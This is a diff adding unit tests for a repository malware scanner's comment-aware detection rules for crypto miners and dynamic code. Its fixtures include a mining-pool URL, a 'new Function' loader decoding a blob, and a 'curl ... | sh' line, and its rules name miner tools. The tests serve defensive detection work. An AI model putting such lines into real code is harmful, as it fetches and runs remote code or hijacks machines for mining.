@@ -167,6 +167,67 @@ describe("test-source and documented-placeholder controls", () => {
   })
 })
 
+describe("rules about executable syntax ignore comments", () => {
+  const miner = {
+    id: "CRYPTO_MINER",
+    name: "Cryptocurrency Miner",
+    pattern: "stratum\\+tcp://|xmrig|cryptonight",
+    description: "Cryptocurrency mining code",
+    tags: ["miner"],
+    severity: "critical" as const,
+  }
+  const newFunction = {
+    id: "OBF_NEW_FUNCTION",
+    name: "new Function() Constructor",
+    pattern: "new\\s+Function\\s*\\((?!\\s*\\))[^)]{0,200}\\)",
+    description: "Dynamic code",
+    tags: ["dynamic-code"],
+    severity: "medium" as const,
+  }
+
+  it("does not flag a pool named in a comment that explains a pattern", () => {
+    // This scanner's own source, which scanned as a critical crypto miner.
+    const content = [
+      "// A mining pool is a host, so require one: `stratum+tcp://pool.minexmr.com:3333`.",
+      "const miningPatterns = [hostPattern]",
+    ].join("\n")
+    expect(applyYaraRules(content, [miner], "src/github/repo-scanner.ts")).toHaveLength(0)
+  })
+
+  it("does not flag the module wrapper quoted in a comment", () => {
+    const content = "/* Matching a bare req flagged new Function('module', 'exports', 'require', src). */"
+    expect(applyYaraRules(content, [newFunction], "src/github/repo-scanner.ts")).toHaveLength(0)
+  })
+
+  it("still flags a pool the code connects to", () => {
+    const content = `const pool = "stratum+tcp://pool.supportxmr.com:3333" // mine`
+    expect(applyYaraRules(content, [miner], "src/worker.js")).toHaveLength(1)
+  })
+
+  it("still flags a dynamic function the code builds", () => {
+    const content = "// builds a loader\nconst run = new Function('payload', atob(blob))"
+    expect(applyYaraRules(content, [newFunction], "src/loader.js")).toHaveLength(1)
+  })
+
+  it("leaves other rules reading comments, where payloads do hide", () => {
+    const hidden = {
+      id: "GLASSWORM_INVISIBLE_UNICODE",
+      name: "Invisible Unicode",
+      pattern: "xmrig",
+      description: "Payload text hidden from the reader",
+      tags: ["obfuscation"],
+      severity: "high" as const,
+    }
+    const content = "// xmrig"
+    expect(applyYaraRules(content, [hidden], "src/app.js")).toHaveLength(1)
+  })
+
+  it("does not apply JavaScript comment rules to a shell script's URLs", () => {
+    const content = "curl https://example.com/x | sh\ncryptonight_hash() { :; }"
+    expect(applyYaraRules(content, [miner], "scripts/install.sh")).toHaveLength(1)
+  })
+})
+
 describe("placeholder secret classification", () => {
   const rule = {
     id: "HARDCODED_API_KEY",
